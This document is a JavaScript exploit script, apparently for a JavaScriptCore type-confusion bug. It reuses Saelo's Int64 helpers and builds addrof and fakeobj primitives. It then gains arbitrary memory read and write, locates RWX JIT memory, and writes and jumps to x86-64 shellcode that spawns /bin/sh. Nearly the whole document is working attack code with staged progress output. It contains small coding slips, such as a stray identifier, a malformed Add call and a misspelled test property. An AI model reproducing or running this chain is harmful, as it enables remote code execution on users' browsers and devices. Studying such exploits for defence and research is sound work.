


/* Following code is exploit utility written by Saelo */

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
    
	    float64: float64View
    };
})();

function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
	    
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
		    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);

            }
            break;
        case 'undefined':
            break;
        default:
		    throw TypeError(" Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

  
	    return Struct.unpack(Struct.float64, bytes);
    
    };


    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);
        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;

    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a ^ b
    this.assignXor = operation(function sub(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return addr + val
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}
/*function hex(x) {
	    if (x < 0)
		        return `-${hex(-x)}`;
	    return `0x${x.toString(16)}`;
}*/
// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);



/* OKay, utility functions are all preapred */
/* The follwing code is my exploit script */


// Simple function to force DFG JIT
function makeJITCompiledFunction(){
	function target(x){
		 return x;
	}
	for(var i = 0; i <1000; i++)
		target(i);
	return target;

}


function display64bitAddress(first4bytes, last4bytes) {
	let value  = "0x"+first4bytes  + last4bytes;
	return value;
}

// Get Address of a object
function getAddrof(fake_object_memory,fake_object,obj, offset = 0){


	fake_object.a = obj;
	addressString = display64bitAddress(fake_object_memory[5].toString(16),(fake_object_memory[4] + offset).toString(16));

	return  new Int64(addressString);
	

}

// Setup a fake object
function setFakeobj(fake_object_memory,address,fake_object){
	ptr = address.toString().replace("0x","");
	fake_object_memory[5] = parseInt('0x'+ptr.substring(0,8),16);
	fake_object_memory[4] = parseInt('0x'+ptr.substring(8,16),16);
	return fake_object.a;
}

// Enforce garbage collection
function gc() {

	for (let i = 0; i < 10; i++) {
		let ab = new ArrayBuffer(1024 * 1024 * 10);
		

	}
}

// This function will trigger the bug
function trigger(obj) {

	// Trigger DFG JIT Optimization
	for (let i = 0; i < 500; i++) {
			
	}

	//Create an object for use
	let tmp = {a: 1};

	gc();
	tmp.__proto__ = {};
	/* Step 4 */
	/* store the structureID of tmp in JSPropertyNameEnumerator */

	for (let k in tmp) {

	
		tmp.__proto__ = {}; 
	
		gc(); 
		
		/* Step 5 */
		/* obj gets the structureID of tmp since it's compared to the JSPropertyNameEnumerator */

		obj.__proto__ = {}; 
		return obj[k];  // This willl rcesult to reading out a value if stored as an array
	}
}

/* step 0 : Prepare structure {} */
trigger({});

/* Step 1 */
/* Create some controllable memory. Create a fake object with fake structure. Set StructureID to that of {} which is 0x4c */
print("Stage 1:")
print("	[+] Allocating controllable  memory")
let fake_object_memory = new Uint32Array(100);
fake_object_memory[0] = 0x0000004c;
fake_object_memory[1] = 0x01001600;

/* Step 2  */
/* Trigger type confusion. */

print("	[+] Triggering type confusion");
let fake_object = trigger(fake_object_memory);

/* Step 3*/
/*
 * Change the structure ID of our fake object and make the property a be an object. 
 *New layout will be | Structure | butterfly (which is nil) | Vector (pointer to base of the object) |
 */
print("	[+] Change the fake object structure to one that give us and pointer to the object {}")
print("	[+] Setup fake object");
let fakeobj = {l33t:13.37};
let addrof = getAddrof(fake_object_memory, fake_object,fakeobj);
print("	[+] Address of fake object : "+addrof)
let obj = setFakeobj(fake_object_memory,addrof,fake_object);

print("	[+] Fake object layout is now:");
print("	[+] -------------------------------------------------------")
print("	[+] | Structure | Butterfly (nil) | Address of object fake|")
print("	[+] -------------------------------------------------------")

if(obj.l33t !== 13.37){
	throw new Error(" [-]Exploit failed. Type confusion didn't work :(");


}

print('	[+] R/W primitives worked!!');
print("Stage 2:")


/*
 * Spray some arrays to get more structure ID's set.
 */


var sprayedStructs = []
for (var i = 0; i < 0x1000; ++i) {
	var a = [13.37];
       a['prop']= 13.37;
	a['prop' + i] = 13.37;
	sprayedStructs.push(a);
}

/*
 * Goal is to achieve AAR/AAW using our getAddrof and setFakeobj. 
 * To achieve that we need to allocate some memory that we can read to an write to at will.\
 * We need to create an object that will allow as to write raw doubles and read Objects address
 * We will use ArraywithDouble to write raw doubles and ArraywithContigous to read objects
 *
 * To achieve the above we need to find a way to access the two arrays as if they were one. 
 * We can manipulate an objects victim to point to that area sinse GigaCage won't allows use do it in an objects properties.
 *
 * There is also a check that ensures that an objects address is in the GigaCage's range. Luckily the check isn't done on the butterfly value
 */

// Pick a random random Object
let victim = sprayedStructs[0x800];

let boxedArray = [{}]; // ArrayWithContigous
let unboxedArray = [13.337,13.37,13.37,13.37]; //ArrayWithDouble
unboxedArray[0] = 13.37; // force to copyOnWriteArray
let victimAddress = getAddrof(fake_object_memory, fake_object,victim);



/*
 * We will setup a fake object  that we wil use to manipulate the victim.
 * We use getAddrof and setFakeobj in stage 1 to to crate the Structure details of the object
 */

print("	[+]  Fake Object setup");

// Step 1: Create some utility Arrays. The new Arrays will share the same same value at vector value. This behaviour allows us to
// use them as goos candidates to convert value in u8, u32, f64 types
var convert = new ArrayBuffer(0x10);
var u32 = new Uint32Array(convert);
var u8 = new Uint8Array(convert);
var f64 = new Float64Array(convert);

let unboxed_size =100;
var BASE = 0x100000000;
function intergerToFloat(i) {

	u32[0] = i%BASE;
	u32[1] = (i/BASE)
	return f64[0];
}

function floatToInterger(f) {
	    f64[0] = f;
	return u32[0] + BASE*u32[1];i
}



// Step 2 : Get some Structure ID variables
u32[0] = 0x200 //StructureID

u32[1] = 0x01082007 - 0x10000; // Fake JSCell metadata
let  arrayWithDoubleFlags = f64[0]; 

u32[1] = 0x01082009 - 0x10000; // Fake JSCell metadata
let arrayWithContigousFlags = f64[0];

var vector = new Uint8Array(0x100);
// Step 3. Create a 'container' to hold our fakeObject which is an  arrrayWithContigous using the value above and set the butterfly to victim
let container= {
	jscell:  arrayWithContigousFlags,
	butterfly: victim,
	vector: vector,
        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
}

// Step 4. Get the attributes of the above fakeJSCell 

let addressOfContainerPropeties = getAddrof(fake_object_memory, fake_object,container,0x10);

// Step 5. Create a fake object whose butterfly points to the victim
let fakeJSObject = setFakeobj(fake_object_memory,addressOfContainerPropeties ,fake_object );
print("	[+] Fake JSObject has been steup successfully");

// Step 6. Get the shared butterfly. We will used that of  unboxedArray since it allows us to wrie raw binary data
fakeJSObject[1] = unboxedArray; // set the butterfly of victim to unboxedArray
let shared_butterfly  =  victim[1];  // Shared butterfly is noew equals to the buffertly of unboxedArray
let original_shared_butterfly = shared_butterfly; //Let's save the original beacuse we will  use the share_butterfly over and over
// Step 7. Make boxedArray use the shared butterfly. This important since it will allow us to read out raw memory since its an arrayWithContigous and can sto// re stuff like pointers etc
fakeJSObject[1] = boxedArray; // set butterfly of victim to that of boxedArray
victim[1] = shared_butterfly; // set butterfly of boxed to that of shared butterfly. Now boxedArray and unboxedArray will access the same memory

// Step 8. Create a memory utility to help in doing R/W stuff
let memory = {

	addrof: function(obj){
		boxedArray[0] = obj;
		return floatToInterger(unboxedArray[0]);
	},
	fakeobj: function(addr){
		unboxedArray[0] = intergerToFloat(addr);
		return boxedArray[0];
	},
	butterflySetup: function(butterfly){
	        shared_butterfly = new Int64(butterfly).asDouble()
                fakeJSObject[1] = boxedArray;
                victim[1] = shared_butterfly;
                fakeJSObject[1] = unboxedArray;
                victim[1] = shared_butterfly;

	},
	writeBytes: function(data, where){
		let bytes = new Uint8Array(data);
		for(i = 0; i < data.length; i++)
			this.write64(new Int64(bytes[i]).asDouble(),Add(where,i));
	},
	write64: function(what, where){
		this.butterflySetup(where);
		return unboxedArray[0] = what;

	},
	// This to ensure capacity and length are never 0
	sanityCheck: function(where){
		// Check capacity and enforce
		if(typeof(unboxedArray[0]) == 'undefined'){
			this.write64(0x3,where - 0x8);
			this.butterflySetup(where);
		}
	},
	read64: function(where,rawbytes=false){
               
		if(rawbytes)
			return unboxedArray[0]; // if its test let just read the raw bytes
		
		this.butterflySetup(where) // Setup butterfly
		this.sanityCheck(where);// Do a sanity check to ensure length is okay
		return unboxedArray[0] // lets get the JsValue

	},	
	test: function() {
	
		let obj = {tiest:'pass'}
		var addr = this.addrof(obj);
		let x = this.fakeobj(addr);

		if (x.test != 'pass' ) {
			print("	[-] Stage 2 fakeobj faiiled");
		}
		let  propertyAddr = Add(addr + 0x10);
		let testValue =  0x4141414141414141;
		this.write64(testValue, propertyAddr);
		let result = this.read64(propertyAddr);	
		if(result != testValue)
			throw new Error("	[-] Arbitraty Read / Write faiiled");

		print("	[+] Arbitrary Address Read/Write achieved")

		
	}


};

memory.test();

/**
 * We want to get some are that is marked RWX. We can achieve this by using function that has been compile in JIT(a JITed function)
 * The we want to write some shell code using our AAR/AAW 
 * The finally we execute our shellcode by calling our JITed function
 */

print("Stage 3:")


// Step 1. Make a JIT compiled function
let func = makeJITCompiledFunction();
let funcAddr = memory.addrof(func);
print("	[+] Address of JITed  code : 0x"+funcAddr.toString(16));

// Step 2. Lets get the address of m_executable which is in offeset 0x18 from the JSFunction
let executableAddr = memory.read64(Add(funcAddr, 0x18));
print("	[+] Executable instance : 0x" + floatToInterger(executableAddr).toString(16));

//Step 3. Lets get the address of a JIT Code instance m_jitCodeForCall which is at offset 0x18 of m_executable
let jitCodeAddr = memory.read64(Add(new Int64.fromDouble(executableAddr),0x18));
print("	[+] JIT Code Instance : 0x" + floatToInterger(jitCodeAddr).toString(16));


// Step 4. Lets get the address of RWX memory used by the functions indicated by m_withArityCheck which is offset 0x20 of m_jitCodeForCall
let rwxMemAddr = memory.read64(Add(new Int64.fromDouble(jitCodeAddr), 0x20));
print("	[+] RWX Memory : 0x" + floatToInterger(rwxMemAddr).toString(16));

print("Stage 4: ")
print("	[+] Copying shellcode to RWX Memory")
// Step 5. Lets copy our shellcode into the rwx area
// Simple shellcode to prompt a shell
let shellcode = [0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05]
memory.writeBytes(shellcode,Add(new Int64.fromDouble(rwxMemAddr), 0x0))

print("	[+] Jumping to shellcode")

// Step 6. Execute our shellcode
func()
